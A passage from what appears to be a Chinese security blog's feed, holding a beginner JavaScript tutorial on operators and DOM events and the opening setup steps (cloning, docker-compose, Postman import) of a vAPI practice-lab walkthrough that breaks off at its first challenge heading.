<span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>null<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> a = <span class="literal">null</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="literal">null</span> == a);</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> a);</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1717325339694-d04668d1-517e-4632-aa8a-ba4f8c5c3767.png"></p><h1 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h1><h2 id="赋值"><a href="#赋值" class="headerlink" title="赋值"></a>赋值</h2><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1717325624902-cee64106-9995-463d-a2b2-0e0350691505.png"></p><h2 id="算数"><a href="#算数" class="headerlink" title="算数"></a>算数</h2><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1717326210339-263e2397-961d-4701-ab33-99c867d128ed.png" alt="+ 类似于Java的字符串拼接"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1717326341941-5c749aec-6346-4d86-bec7-5d9d4f456197.png" alt="自减运算符与之相同，类似于c语言"></p><p>总结：一与++符号在前表示先运算后赋值；在后面表示先赋值后运算</p><h2 id="字符串-1"><a href="#字符串-1" class="headerlink" title="字符串"></a>字符串</h2><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1717326492662-7a1c41f8-2cbb-44f7-9d09-16703ea0ea4e.png"></p><h2 id="比较"><a href="#比较" class="headerlink" title="比较"></a>比较</h2><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1717326536839-62440303-42bf-41c4-bef2-1e3a47f5255a.png" alt="比较运算符得到的结果为布尔型"></p><h2 id="逻辑"><a href="#逻辑" class="headerlink" title="逻辑"></a>逻辑</h2><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1717326653947-8a06cbf3-abe8-4960-8680-b22e395df851.png"></p><h2 id="三元"><a href="#三元" class="headerlink" title="三元"></a>三元</h2><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1717326733100-b81ebaa4-f01e-4d70-9ebd-3ac4ca97e674.png" alt="类似c语言"></p><h1 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h1><p>if、for、switch、while、do while 都与c语言相同</p><h1 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h1><p>事件，即用户在客户端上进行某一个行为（操作），该行为会触发某一段代码的执行，就叫某某事件。例如用户点击某个地方，就显示一个弹窗，此操作就触发了某一个事件，执行了事件对应的事件处理程序。</p><p>事件处理程序即为JS代码</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html各种标签</span> <span class="attr">属性</span> <span class="attr">on事件名称</span>=<span class="string">&quot;JS代码（事件处理程序）&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><h2 id="事件处理程序"><a href="#事件处理程序" class="headerlink" title="事件处理程序"></a>事件处理程序</h2><h3 id="直接在HTML中编写JS代码"><a href="#直接在HTML中编写JS代码" class="headerlink" title="直接在HTML中编写JS代码"></a>直接在HTML中编写JS代码</h3><p>例：<font style="color:#bcbec4;background-color:#1e1f22;"><input type="button" name="button" id="button" value="按钮" onclick="alert('hello JS')"></font></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1717328315172-e0e68d14-56c9-49ca-9135-da885f0333aa.png" alt="点击就会触发alert弹窗"></p><p>代码可读性较差</p><h3 id="使用函数作为事件处理程序"><a href="#使用函数作为事件处理程序" class="headerlink" title="使用函数作为事件处理程序"></a>使用函数作为事件处理程序</h3><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1717328617147-44339304-f05d-47c5-a5a6-f83574759391.png" alt="触发hello函数"></p><h2 id="常用事件"><a href="#常用事件" class="headerlink" title="常用事件"></a>常用事件</h2><h3 id="页面事件"><a href="#页面事件" class="headerlink" title="页面事件"></a>页面事件</h3><ul><li>onload：当页面被载入之后所执行的代码，页面载入即浏览器已经分析出HTML结构（页面载入后就执行）</li><li>onresize：当页面的尺寸发生变化时所执行的代码</li></ul><h4 id="onload"><a href="#onload" class="headerlink" title="onload"></a>onload</h4><p>针对 body 标签使用</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span>//这段代码的意义为当页面载入后打印id为content的内容“content”</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span>//要注意 此时script标签要在body标签下面</span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span>//（代码从上往下执行，要先有content，才能调用）</span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;content&quot;</span>&gt;</span>content<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;content&#x27;</span>))</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">function</span> <span class="title function_">init</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;content&#x27;</span>));</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;init()&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;content&quot;</span>&gt;</span>content<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">  </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="onresize"><a href="#onresize" class="headerlink" title="onresize"></a>onresize</h4><p>当我们改变页面大小时会执行JS</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">function</span> <span class="title function_">init</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;resize&#x27;</span>));</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;init()&quot;</span> <span class="attr">onresize</span>=<span class="string">&quot;alert(&#x27;hh&#x27;)&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;resize&quot;</span>&gt;</span>resize<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1717329901790-4be1d1d0-bdb1-4813-bd30-dede78491565.png"></p><h3 id="焦点事件"><a href="#焦点事件" class="headerlink" title="焦点事件"></a>焦点事件</h3><p>对于表单中文本框使用</p><ul><li>onfocus：获得焦点时触发</li><li>onblur：失去焦点时触发</li></ul><h4 id="onfocus"><a href="#onfocus" class="headerlink" title="onfocus"></a>onfocus</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;aa&quot;</span> <span class="attr">onfocus</span>=<span class="string">&quot;getFocus()&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">getFocus</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">alert</span>(<span class="string">&quot;获取焦点&quot;</span>)</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1717330319258-4e866ca3-9163-4f95-b0c3-c1fb983d1a85.png"></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;aa&quot;</span> <span class="attr">onfocus</span>=<span class="string">&quot;getFocus(this)&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">getFocus</span>(<span class="params">obj</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      obj.<span class="property">value</span>=<span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="onblur"><a href="#onblur" class="headerlink" title="onblur"></a>onblur</h4><p>失去焦点，可用来判断数据的合法性</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">name</span>=<span class="string">&quot;form&quot;</span>&gt;</span></span><br><span class="line">      用户名<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">id</span>=<span class="string">&quot;username&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">      密码<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">id</span>=<span class="string">&quot;password&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">name</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span> <span class="attr">id</span>=<span class="string">&quot;btn&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">//获取元素</span></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">var</span> form=<span class="variable language_">document</span>.<span class="property">forms</span>[<span class="string">&#x27;form&#x27;</span>];</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">var</span> username=form.<span class="property">elements</span>[<span class="string">&#x27;username&#x27;</span>];</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">var</span> password=form.<span class="property">elements</span>[<span class="string">&#x27;password&#x27;</span>];</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">//验证（用失去焦点验证）</span></span></span><br><span class="line"><span class="language-javascript">      username.<span class="property">onblur</span>=<span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> len=<span class="variable language_">this</span>.<span class="property">value</span>.<span class="property">length</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (len ==<span class="number">0</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="title function_">alert</span>(<span class="string">&quot;请输入用户名&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;<span class="keyword">else</span> <span class="keyword">if</span> (len&lt;<span class="number">4</span>||len&gt;<span class="number">18</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="title function_">alert</span>(<span class="string">&quot;用户名长度为4-18位&quot;</span>)</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">      password.<span class="property">onblur</span>=<span class="keyword">function</span> (<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> len=<span class="variable language_">this</span>.<span class="property">value</span>.<span class="property">length</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (len ==<span class="number">0</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="title function_">alert</span>(<span class="string">&quot;请输入密码&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;<span class="keyword">else</span> <span class="keyword">if</span> (len&lt;<span class="number">4</span>||len&gt;<span class="number">18</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="title function_">alert</span>(<span class="string">&quot;密码长度为4-18位&quot;</span>)</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当点击文本框后，再点击页面空白处，即为失去焦点（该代码为文本框）</p><h3 id="点击事件"><a href="#点击事件" class="headerlink" title="点击事件"></a>点击事件</h3><p>并不是针对按钮才可以使用，针对div、p等标签都可以使用</p><ul><li>onclick：单击事件</li><li>ondblclick：双击事件，也会触发单击事件</li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>点击事件<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;border: 1px solid #333; width: 100px; height: 100px&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;clickme()&quot;</span> <span class="attr">ondblclick</span>=<span class="string">&quot;dblclick()&quot;</span>&gt;</span>点击事件<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">function</span> <span class="title function_">clickme</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;鼠标单击&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">function</span> <span class="title function_">dblclick</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;鼠标双击&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1717341581919-27741790-7f3a-41aa-9815-d2c28b1b774b.png"></p><h3 id="鼠标事件"><a href="#鼠标事件" class="headerlink" title="鼠标事件"></a>鼠标事件</h3><ul><li>onmouseover：鼠标滑入时触发的事件</li><li>onmouseout：鼠标滑出时触发的事件</li><li>onmousedown：鼠标被按下时触发的事件</li><li>onmouseup：鼠标的抬起事件</li><li>onmousemove：鼠标滑动事件</li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;border: 1px solid #333 ;width: 100px;height: 100px &quot;</span><span class="attr">onmouseover</span>=<span class="string">&quot;over()&quot;</span> <span class="attr">onmousemove</span>=<span class="string">&quot;move()&quot;</span> <span class="attr">onmouseup</span>=<span class="string">&quot;up()&quot;</span><span class="attr">onmousedown</span>=<span class="string">&quot;down()&quot;</span><span class="attr">onmouseout</span>=<span class="string">&quot;out()&quot;</span>&gt;</span>鼠标事件<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> !<span class="attr">src</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">move</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;鼠标滑动&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">up</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;鼠标抬起&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">down</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;鼠标按下&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">over</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;鼠标滑入div&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">out</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;鼠标滑出div&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1717343052203-2c568344-6a1a-4247-8db5-1960602a6524.png"></p>]]></content>
      
      
      <categories>
          
          <category> 安全开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vAPI靶场</title>
      <link href="/2025/05/27/vAPI%E9%9D%B6%E5%9C%BA/"/>
      <url>/2025/05/27/vAPI%E9%9D%B6%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="前期准备工作"><a href="#前期准备工作" class="headerlink" title="前期准备工作"></a>前期准备工作</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/roottusk/vapi.git</span><br><span class="line">cd vapi/</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>安装完成后访问<a href="http://ip/vapi/">http://IP:80/vapi/</a> 即可访问 vAPI</p><h2 id="postman配置"><a href="#postman配置" class="headerlink" title="postman配置"></a>postman配置</h2><p>下载的&#x2F;vapi&#x2F;postman路径下有两个文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vAPI.postman_collection.json</span><br><span class="line">vAPI_ENV.postman_environment.json</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323083402442.png" alt="image-20250323083402442"></p><p>将这两个文件一起导入postman</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323083458104.png" alt="image-20250323083458104"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323083517027.png" alt="image-20250323083517027"></p><h2 id="设置host"><a href="#设置host" class="headerlink" title="设置host"></a>设置host</h2><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323083708280.png" alt="image-20250323083708280"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323083715363.png" alt="image-20250323083715363"></p><p>之后要再修改值</p><p>或者直接在环境中添加变量</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323084801611.png" alt="image-20250323084801611"></p><p>在之后直接引用这个环境</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323084921280.png" alt="image-20250323084921280"></p><h1 id="通关过程"><a href="#通关过程" class="headerlink" title="通关过程"></a>通关过程</h1><h2 id="API1-失效的对象级授权"><a href="#API1-失效的对象级授权" class="headerlink" title="API1 - 失效的对象级授权"></a>API1 - 失效的对象级授权</h2><blockquote><p>Broken Object Level 